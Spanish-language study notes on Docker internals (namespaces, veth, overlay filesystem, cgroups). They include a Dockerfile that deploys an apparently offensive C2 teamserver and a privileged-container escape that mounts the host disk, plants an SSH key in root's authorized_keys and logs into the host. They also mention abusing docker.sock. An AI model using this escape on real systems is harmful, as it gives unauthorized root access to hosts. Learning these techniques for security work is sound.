# Docker vs Virtualization
Virtualizar spawnea un OS completo 'encima' de otro, tiene su secuencia de boot, filesystem, kernel... El guest cree que está corriendo sobre hardware real pero en realidad, en cada llamada, el servicio de virtualización traduce todas las operaciones low-level al idioma del host.

Por otro lado, la contenerización es otra película, los recursos se compartimentalizan y protegen gracias a tres features del kernel de Linux: namespaces, union filesystem y cgroups.

## Namespaces
Los namespaces son tags que se asignan a los recursos de Linux (procesos, redes, usuarios, filesystems montados...). Por defecto todos los recursos comparten un filesystem de manera que un usuario puede listar todos los procesos, ver todo el filesystem, otros usuarios...
Cuando se crea un contenedor, todos los recursos creados por este nuevo entorno tienen un tag distinto, de manera que existen contenidos en su propio namespace e ignoran todo recurso fuera del mismo.
![[namespace.png]]

Viendo como Linux organiza los procesos esto se entiende perfecto, cuando Docker crea un spawnea un contenedor, se ejecuta a su mismo utilizando el PID 5 en el namspace default, entonces, todos los child processes en el nuevo namespace tienen un PID local (en la imagen de 1), pero un PID 'global' distinto en el namespace default.
Esto hace que los procesos dentro del namespace nuevo no tengan consciencia de lo que ocurre fuera de su entorno, pero los procesos del namespace default tienen total visibilidad de lo que árbol de procesos completo. Todos los recursos interactuan directamente con el kernel sin middleman.

Con los contenedores estamos en un sistema plano pero compatimentalizado, mientras que la virtualización funciona más como una suerte de nesting de muñecas Rusas.

## veth
Al crear un container, Docker crea un par de `veth` (virtual Ethernet), es como si fueran los dos extremos de un cable Ethernet, un extremo va al nuevo namespace, llamadap `eth0` dentro del container, el otro va al default namespace y por él viaja el tráfico desde y hacia Internet, esto s llama network bridge.

Cada contenedor tiene su propio par `veth`, por ende su propia IP del rango `docker0`
```zsh
sudo docker run --rm -it -p 8400-8500:8400-8500 <containerID>
```
Con un comando como este, cualquier request que vaya al host será redirigida a los puertos especificados con `-p` al container en ese rango.

> Para mandar el contenedor al background puede hacerse `CTRL+P` y luego `CTRL+Q`, o con el flag `-d` el comando inicial


## Union filesystem
El Dockerfile es el archivo que contiene las instrucciones a partir de la cuales se construye la imagen.

```c
# file: ~/SILENTTRINITY/Dockerfile
# The base Docker image containing binaries to run Python 3.7
FROM python:stretch-slim-3.7
# We install the git, make, and gcc tools
RUN apt-get update && apt-get install -y git make gcc
# We download SILENTTRINITY and change directories
RUN git clone https://github.com/byt3bl33d3r/SILENTTRINITY/ /root/st/
WORKDIR /root/st/
# We install the Python requirements
RUN python3 -m pip install -r requirements.txt
# We inform future Docker users that they need to bind port 5000
EXPOSE 5000
# ENTRYPOINT is the first command the container runs when it starts
ENTRYPOINT ["python3", "teamserver.py", "0.0.0.0", "stringpassword"]
```

Cada instrucción genera un set de archivos agrupados, estas carpetas se almacenan normalmente en `/var/lib/docker/overlay2/<randomID>`, cuando la imagen ya se ha construido, los archivos se combinan bajo un nuevo directorio llamado *image layer*.
Al lanzar la imagen, Docker monta la image layer dentro del contenedor como un único archivo chrooted sólo de lectura, para poder alterar archivos, añade una capa modificable, llamada *container layer* o *upperdir*.

![[upppedir.png]]

Esto es lo que proporciona inmutabilidad al container, aunque se borrase todo `/bin`, solo se altera la capa modificable superior que enmascara el `/bin` original, cuando el contenedor se borra, esa capa es eliminada, los archivos de la capa inferior creados durante la build se mantienen intactos.

## cgroups
El último componente vital que hace funcionar Docker son los cgroups (control groups), que controlan ciertos aspectos que los namespaces no pueden, como límites de CPU, memoria, red y los dispositivos disponibles al contenedor.
cgroups proporciona una manera de agrupar y limitar procesos de un determinado recursos.


# Privileged mode
En modo privilegiado, Docker mantiene el aislamiento mediante el namespace pero da acceso total desde el contenedor a la máquina host completa. Esto significa que se pueden alterar recursos en el host.
```zsh
root@DemoContainer:/ fdisk -l
Disk /dev/dm-0: 23.3 GiB, 25044189184 bytes, 48914432 sectors
Units: sectors of 1 * 512 = 512 bytes--snip--
# mount the host's main partition
root@DemoContainer:/ mount /dev/dm-0 /mnt && ls /mnt
bin dev home lib lost+found mnt proc...
# inject our SSH key into the root home folder
root@DemoContainer:/ echo "ssh-rsa AAAAB3NzaC1yc2EA..." >
/mnt/root/.ssh/authorized_keys# get the host's IP and SSH into it
root@DemoContainer:/ ssh root@172.17.0.1
root@host:/
```


# Docker Socket
`var/run/docker.sock` es la REST API que el daemon de Docker utiliza para comunicarse con el host, si nos podemos comunicar con él se le puede indicar, por ejemplo, que lance un contenedor privilegiado.


# Recursos
[Docker explained by ByteByteGo](https://youtu.be/Cs2j-Rjqg94?list=PL65_wYSEg5HdGgpkBRymedI24hCXWqB6l)